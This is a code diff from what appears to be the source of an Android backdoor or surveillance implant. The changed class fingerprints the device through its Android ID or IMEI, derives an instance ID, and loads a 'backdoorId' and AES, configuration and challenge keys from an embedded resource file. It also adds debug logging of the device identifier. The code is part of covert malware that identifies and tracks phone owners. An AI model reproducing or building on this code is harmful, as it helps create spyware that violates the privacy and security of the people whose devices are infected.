@@ -64,6 +64,9 @@ public class Keys {
 			final Resources resources = Status.getAppContext().getResources();
 
 			String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
+			if(androidId==null){
+				androidId="EMPTY";
+			}
 
 			if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 				// http://code.google.com/p/android/issues/detail?id=10603
@@ -74,15 +77,19 @@ public class Keys {
 				final String imei = telephonyManager.getDeviceId();
 				androidId = imei;
 			}
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Keys), androidId: " + androidId);
+			}
 
 			instanceId = Encryption.SHA1(androidId.getBytes());
 
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
 			backdoorId = Utils.copy(resource, 0, 14);
-			aesKey = keyFromString(resource, 14, 32);
-			confKey = keyFromString(resource, 46, 32);
-			challengeKey = keyFromString(resource, 78, 32);
+			aesKey = Utils.copy(resource, 14, 16);
+			confKey = Utils.copy(resource, 46, 16);
+			challengeKey = Utils.copy(resource, 78, 16);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
